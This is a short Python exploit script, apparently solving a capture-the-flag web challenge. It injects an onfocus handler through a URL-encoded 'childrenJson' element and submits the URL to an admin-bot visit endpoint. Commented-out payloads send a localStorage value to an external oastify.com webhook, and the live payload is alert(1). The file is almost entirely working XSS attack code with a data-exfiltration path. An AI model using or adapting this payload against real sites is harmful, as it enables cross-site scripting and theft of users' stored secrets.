from urllib.parse import quote
import json
import requests

def generate_children_json(payload):
    if not payload:
        return None
    json_structure = {
        "type": "input",
        "props": {
            "autoFocus": True,
            "onfocus": payload
        },
        "children": None
    }
    return quote(json.dumps(json_structure, separators=(',', ':')))

base = "http://127.0.0.1:3000/"
# base = "https://eo7f6cpw3t4lqq2.m.pipedream.net/"

webhook = 'http://mwmd5u86q0z75t14ztvw416zzq5it8hx.oastify.com'
# payload = """const form = document.createElement('form');
# form.id = 'config';
# form.innerHTML = '<input name="debug"/>';
# document.body.appendChild(form);"""
# payload += 'setTimeout(() => { fetch("WEBHOOK"+"?flag="+localStorage.getItem("debugvaluefortesting")); }, 300);'.replace('WEBHOOK', webhook)

# payload = 'fetch("WEBHOOK");'.replace('WEBHOOK', webhook)
payload = 'alert(1);'
children_json_quoted = generate_children_json(payload)
url_p = f"{base}?name=span&src=&childrenJson={children_json_quoted}"

print(f"Generated URL: {url_p}")

# Send the URL to the /api/visit endpoint
api_url = f"{base}api/visit"
payload_data = {"url": url_p}

# print(f"\nSending POST request to {api_url}...")
# try:
#     response = requests.post(api_url, json=payload_data, headers={"Content-Type": "application/json"})
#     print(f"Response status: {response.status_code}")
#     print(f"Response body: {response.json()}")
# except Exception as e:
#     print(f"Error: {e}")